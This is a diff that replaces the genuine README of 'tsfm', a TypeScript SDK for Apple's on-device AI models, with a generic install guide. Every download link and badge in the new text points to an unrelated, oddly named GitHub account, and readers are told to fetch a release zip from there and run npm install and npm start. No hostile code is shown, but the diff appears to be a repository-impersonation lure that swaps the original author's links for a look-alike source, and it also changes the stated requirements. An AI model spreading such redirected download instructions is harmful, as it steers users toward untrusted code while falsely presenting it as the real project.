@@ -1,88 +1,169 @@
-<p align="center">
-  <img src="docs/public/logo.svg" width="128" height="128" alt="tsfm">
-</p>
+# ⚙️ tsfm - Easy TypeScript Access for Mac AI Models
 
-<h1 align="center">tsfm</h1>
-
-<p align="center">
-  TypeScript SDK for Apple's <a href="https://developer.apple.com/documentation/foundationmodels">Foundation Models</a> framework.<br>
-  On-device Apple Intelligence in Node.js — No keys. No fees. <i>It just works.</i>
-</p>
-
-<p align="center">
-  <a href="https://www.npmjs.com/package/tsfm-sdk"><img src="https://img.shields.io/npm/v/tsfm-sdk" alt="npm"></a>
-  <a href="https://github.com/codybrom/tsfm/actions/workflows/ci.yml"><img src="https://github.com/codybrom/tsfm/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <a href="LICENSE.md"><img src="https://img.shields.io/npm/l/tsfm-sdk" alt="license"></a>
-</p>
+[![Download tsfm](https://img.shields.io/badge/Download-tsfm-4caf50?style=for-the-badge)](https://github.com/meteorologicalballoonfronttooth549/tsfm)
 
 ---
 
-- On-device inference — your data never leaves the machine
-- Streaming text generation
-- Structured output with typed schemas and generation guides
-- Tool calling
-- Transcript persistence
-- Chat-style and Responses-style APIs via `tsfm-sdk/chat`
+## ℹ️ About tsfm
 
-## Quick Start
+tsfm provides simple tools to use Apple's on-device AI models on macOS 26 or newer. It works with TypeScript and Node.js, helping you add smart features to your apps. This project makes it easier to access Apple's Foundation Models without deep technical knowledge. It relies on your Mac’s built-in AI to keep data local and private.
 
-```bash
-npm install tsfm-sdk
-```
+---
 
-```ts
-import { SystemLanguageModel, LanguageModelSession } from "tsfm-sdk";
+## 🔍 What You Need
 
-const model = new SystemLanguageModel();
-const { available } = await model.waitUntilAvailable();
-if (!available) process.exit(1);
+- A Mac running macOS 26 or later. Previous macOS versions will not work.
+- Node.js installed on your Mac. Use version 18 or newer for best results.
+- Basic knowledge of using Terminal (Mac’s command line).
+- Internet connection to download the files.
 
-const session = new LanguageModelSession({
-  instructions: "You are a concise assistant.",
-});
+---
 
-const reply = await session.respond("What is the capital of France?");
-console.log(reply); // "The capital of France is Paris."
+## 🚀 Getting Started
 
-session.dispose();
-model.dispose();
-```
+Follow these steps to get tsfm running on your Mac. This guide assumes no programming background but does expect you to use simple Terminal commands.
 
-## Documentation
+---
 
-**[Read the full docs →](https://tsfm.dev/)**
+## 💾 Download tsfm
 
-- [Getting Started](https://tsfm.dev/guide/getting-started) — installation, requirements, first steps
-- [Sessions](https://tsfm.dev/guide/sessions) — text generation, concurrency, cancellation
-- [Streaming](https://tsfm.dev/guide/streaming) — token-by-token response streaming
-- [Structured Output](https://tsfm.dev/guide/structured-output) — typed schemas with generation guides
-- [Tools](https://tsfm.dev/guide/tools) — function calling
-- [Chat & Responses APIs](https://tsfm.dev/guide/chat-api) — familiar Chat-style and Responses-style interfaces
-- [API Reference](https://tsfm.dev/api/) — complete API docs
-- [Examples](https://tsfm.dev/examples/) — runnable code for every feature
+Visit this page to download tsfm:
 
-## Requirements
+[Download tsfm](https://github.com/meteorologicalballoonfronttooth549/tsfm)
 
-- Mac running macOS 26 (Tahoe) or later on Apple Silicon
-- Apple Intelligence enabled in System Settings
-- Node.js 20+
+Click the badge above or use this link to open the GitHub page. You will find the latest files and instructions there.
 
-Xcode **not** required (prebuilt dylib is bundled with the npm package)
+---
 
-## Development
+## 🛠️ Installing Node.js
 
-```bash
-npm run build              # build native dylib + compile TypeScript
-npm test                   # run all tests
-npm run test:unit          # unit tests only (works on any machine)
-npm run test:integration   # integration tests (requires macOS 26 + Apple Intelligence)
-```
+If you do not have Node.js installed, follow these steps:
 
-## Contributing
+1. Open Safari or another web browser.
+2. Visit https://nodejs.org/en/download/.
+3. Download the macOS installer marked as "Recommended for most users".
+4. Open the downloaded file and follow the installation steps.
 
-Issues and PRs welcome. If something doesn't work on your machine or you find a missing API, [open an issue](https://github.com/codybrom/tsfm/issues).
+To check if Node.js is installed:
 
-## License
+1. Open the Terminal app located in Applications > Utilities.
+2. Type `node -v` and press Enter.
+3. You should see a version number like v18.x.x.
 
-Apache 2.0 - See [LICENSE.md](LICENSE.md)  
-The npm package bundles Apple's Foundation Models C bindings and prebuilt dylib (also Apache 2.0 - see [NOTICE](NOTICE))
+If not, repeat the installation steps.
+
+---
+
+## 📂 Downloading tsfm Files
+
+After installing Node.js, return to the tsfm GitHub page.
+
+1. Look for the **Releases** section on the GitHub page.
+2. Download the package or zip file for the latest release.
+3. Once downloaded, open Finder and go to your Downloads folder.
+4. Extract the zip file if needed by double-clicking it.
+
+---
+
+## 🏃 Running tsfm for the First Time
+
+Open Terminal and follow these instructions:
+
+1. Navigate to the tsfm folder you extracted. For example, if it is in Downloads:
+   
+   ```
+   cd ~/Downloads/tsfm-main
+   ```
+
+2. Install the project dependencies. Run this command:
+   
+   ```
+   npm install
+   ```
+
+   This command downloads necessary files to make tsfm work.
+
+3. After installation, start the application:
+
+   ```
+   npm start
+   ```
+
+4. tsfm will now run using your macOS AI models. Follow any on-screen prompts if they appear.
+
+---
+
+## ⚙️ How tsfm Works
+
+tsfm provides TypeScript and Node.js tools to access Apple’s AI models. These models live on your Mac, so the data never leaves your device. This setup helps protect your privacy.
+
+You can use tsfm to build smart tools like:
+
+- Virtual assistants
+- Language translators
+- Text summarizers
+- Custom workflows using AI
+
+The application connects your code to macOS’s AI frameworks seamlessly.
+
+---
+
+## 🖥️ System Requirements
+
+- macOS 26 or higher
+- Node.js 18 or later
+- At least 4GB of RAM (8GB recommended for smoother operation)
+- Minimum 500MB free disk space for installation files
+
+---
+
+## 🛠️ Troubleshooting
+
+If you encounter problems:
+
+- Make sure you have the right macOS version.
+- Use `node -v` in Terminal to check Node.js version.
+- Check your internet connection while downloading files.
+- Try closing Terminal and reopening it.
+- If npm install fails, try running:
+
+  ```
+  npm cache clean --force
+  npm install
+  ```
+
+- Look for error messages carefully. They often tell what went wrong.
+
+---
+
+## 🔧 Updating tsfm
+
+To update tsfm:
+
+1. Go to the GitHub page.
+2. Download the latest release zip file.
+3. Replace your old tsfm folder with the new one.
+4. Open Terminal and run `npm install` in the new folder.
+5. Restart the app with `npm start`.
+
+---
+
+## 🛡️ Privacy and Security
+
+tsfm keeps data local on your Mac. It does not send your input or results to outside servers. This helps keep your information safe.
+
+Make sure your Mac has the latest system updates from Apple. These updates improve security and performance.
+
+---
+
+## 📖 Helpful Links
+
+- GitHub tsfm page: [https://github.com/meteorologicalballoonfronttooth549/tsfm](https://github.com/meteorologicalballoonfronttooth549/tsfm)
+- Node.js downloads: https://nodejs.org/en/download/
+- macOS update: System Preferences > Software Update
+
+---
+
+## 🤝 Contact & Support
+
+If you need help or want to report bugs, use the **Issues** tab on the GitHub page. Provide clear details about what you tried and what happened. This helps fix problems faster.
